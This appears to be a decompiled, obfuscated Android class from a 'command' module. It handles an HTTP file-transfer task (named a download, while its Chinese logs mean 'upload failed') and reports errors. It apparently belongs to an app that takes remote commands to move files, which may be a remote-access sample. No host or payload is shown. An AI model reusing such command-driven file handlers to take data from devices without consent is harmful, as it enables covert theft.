package com.storm.safe.rock.service.modules.command;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.C1496yx;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.FileCommandHandler$handleFileDownloadHttp$3", m214403f = "FileCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class FileCommandHandler$handleFileDownloadHttp$3 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C1496yx f53475a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53476a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f53477a3;

    /* renamed from: a4 */
    public final /* synthetic */ String f53478a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public FileCommandHandler$handleFileDownloadHttp$3(C1496yx c1496yx, String str, String str2, String str3, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53475a1 = c1496yx;
        this.f53476a2 = str;
        this.f53477a3 = str2;
        this.f53478a4 = str3;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new FileCommandHandler$handleFileDownloadHttp$3(this.f53475a1, this.f53476a2, this.f53477a3, this.f53478a4, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((FileCommandHandler$handleFileDownloadHttp$3) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C1351vv c1351vv = C1351vv.f60710b1;
        String str = this.f53478a4;
        String str2 = this.f53477a3;
        C1496yx c1496yx = this.f53475a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            String str3 = this.f53476a2;
            c1496yx.getClass();
            JSONObject jSONObjectM215318b3 = C1496yx.m215318b3(str3, str2, str);
            if (!jSONObjectM215318b3.has("error")) {
                return c1351vv;
            }
            String string = jSONObjectM215318b3.getString("error");
            t60.m214694b5(string, "result.getString(\"error\")");
            C1496yx.m215317b2(str2, str, string);
            return c1351vv;
        } catch (Exception e) {
            t60.m214705c6("FileCmdHandler", "HTTP 上传失败", e);
            if (c1496yx == null) {
                return null;
            }
            String message = e.getMessage();
            if (message == null) {
                message = "未知错误";
            }
            C1496yx.m215317b2(str2, str, message);
            return c1351vv;
        }
    }
}
